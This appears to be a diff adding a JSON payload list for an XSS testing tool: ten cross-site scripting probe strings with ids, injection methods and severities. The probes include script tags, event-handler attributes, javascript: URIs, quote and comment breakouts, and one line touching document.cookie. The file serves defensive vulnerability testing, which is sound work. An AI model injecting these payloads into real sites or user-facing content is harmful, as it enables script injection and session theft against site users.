@@ -1,0 +1,16 @@
+{
+  "name": "Cross-Site Scripting (XSS)",
+  "description": "Payloads for testing XSS vulnerabilities",
+  "payloads": [
+    {"id": "xss-01", "value": "<script>alert('XSS')</script>", "method": "replace", "severity": "high"},
+    {"id": "xss-02", "value": "<img src=x onerror=alert(1)>", "method": "replace", "severity": "high"},
+    {"id": "xss-03", "value": "<svg onload=alert(1)>", "method": "replace", "severity": "high"},
+    {"id": "xss-04", "value": "javascript:alert(1)", "method": "replace", "severity": "medium"},
+    {"id": "xss-05", "value": "\"><script>alert(1)</script>", "method": "append", "severity": "high"},
+    {"id": "xss-06", "value": "'><script>alert(1)</script>", "method": "append", "severity": "high"},
+    {"id": "xss-07", "value": "<body onload=alert(1)>", "method": "replace", "severity": "high"},
+    {"id": "xss-08", "value": "<iframe src=javascript:alert(1)>", "method": "replace", "severity": "medium"},
+    {"id": "xss-09", "value": "\"--><script>alert(1)</script>", "method": "append", "severity": "high"},
+    {"id": "xss-10", "value": "<script>document.cookie</script>", "method": "replace", "severity": "high"}
+  ]
+}
